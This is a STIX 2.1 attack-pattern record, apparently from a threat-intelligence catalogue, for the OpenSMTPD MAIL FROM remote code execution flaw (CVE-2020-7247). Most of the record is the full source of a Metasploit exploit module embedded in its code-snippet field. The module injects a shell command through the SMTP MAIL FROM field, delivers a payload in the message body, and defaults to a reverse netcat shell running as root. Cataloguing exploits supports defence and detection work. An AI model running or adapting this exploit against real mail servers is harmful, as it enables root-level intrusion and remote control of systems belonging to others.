{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8efbd811-69d4-4a4b-8efc-73899f28245d",
    "created": "2024-08-14T17:14:11.624256Z",
    "modified": "2024-08-14T17:14:11.62426Z",
    "name": "OpenSMTPD MAIL FROM Remote Code Execution",
    "description": " This module exploits a command injection in the MAIL FROM field during SMTP interaction with OpenSMTPD to execute a command as the root user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/smtp/opensmtpd_mail_from_rce.rb",
            "external_id": "opensmtpd_mail_from_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7247"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2020/q1/40"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Expect\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OpenSMTPD MAIL FROM Remote Code Execution',\n        'Description' => %q{\n          This module exploits a command injection in the MAIL FROM field during\n          SMTP interaction with OpenSMTPD to execute a command as the root user.\n        },\n        'Author' => [\n          'Qualys', # Discovery and PoC\n          'wvu', # Module\n          'RageLtMan <rageltman[at]sempervictus>' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-7247'],\n          ['EDB', '48051'], # raptor's LPE/RCE exploit\n          ['URL', 'https://seclists.org/oss-sec/2020/q1/40']\n        ],\n        'DisclosureDate' => '2020-01-28',\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'OpenSMTPD 6.4.0 - 6.6.1',\n            {\n              'MyBadChars' => \"!\\#$%&'*?`{|}~\\r\\n\".chars\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(25),\n      OptString.new('RCPT_TO', [true, 'Valid mail recipient', 'root'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('ExpectTimeout', [true, 'Timeout for Expect', 3.5])\n    ])\n  end\n\n  def check\n    connect\n    res = sock.get_once\n\n    return CheckCode::Unknown unless res\n    return CheckCode::Detected if res =~ /^220.*ESMTP OpenSMTPD/\n\n    CheckCode::Safe\n  rescue EOFError, Rex::ConnectionError => e\n    vprint_error(e.message)\n    CheckCode::Unknown\n  ensure\n    disconnect\n  end\n\n  def exploit\n    # We don't care who we are, so randomize it\n    me = rand_text_alphanumeric(8..42)\n\n    # Send mail to this valid recipient\n    to = datastore['RCPT_TO']\n\n    # \"Comment slide\" courtesy of Qualys - brilliant!\n    rand_var = rand_text_alpha(1)\n    iter = rand_text_alphanumeric(14).chars.join(' ')\n    from = \";for #{rand_var} in #{iter};do read #{rand_var};done;sh;exit 0;\"\n\n    # Check against RFC 5321, even though OpenSMTPD is more permissive\n    if from.length > 64\n      print_warning('MAIL FROM field is greater than 64 chars')\n    end\n\n    # Check for badchars, even though there shouldn't be any\n    if (badchars = (from.chars & target['MyBadChars'])).any?\n      print_warning(\"MAIL FROM field has badchars: #{badchars}\")\n    end\n\n    # Create the mail body with comment slide and payload\n    body = \"\\r\\n#{\"#\\r\\n\" * 14}#{payload.encoded}\"\n\n    sploit = {\n      nil => /220.*OpenSMTPD/,\n      \"HELO #{me}\" => /250.*pleased to meet you/,\n      \"MAIL FROM:<#{from}>\" => /250.*Ok/,\n      \"RCPT TO:<#{to}>\" => /250.*Recipient ok/,\n      'DATA' => /354 Enter mail.*itself/,\n      body => nil,\n      '.' => /250.*Message accepted for delivery/,\n      'QUIT' => /221.*Bye/\n    }\n\n    print_status('Connecting to OpenSMTPD')\n    connect\n\n    print_status('Saying hello and sending exploit')\n    sploit.each do |line, pattern|\n      send_expect(\n        line,\n        pattern,\n        sock: sock,\n        newline: \"\\r\\n\",\n        timeout: datastore['ExpectTimeout']\n      )\n    end\n  rescue Rex::ConnectionError => e\n    fail_with(Failure::Unreachable, e.message)\n  rescue Timeout::Error => e\n    fail_with(Failure::TimeoutExpired, e.message)\n  ensure\n    disconnect\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-01-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}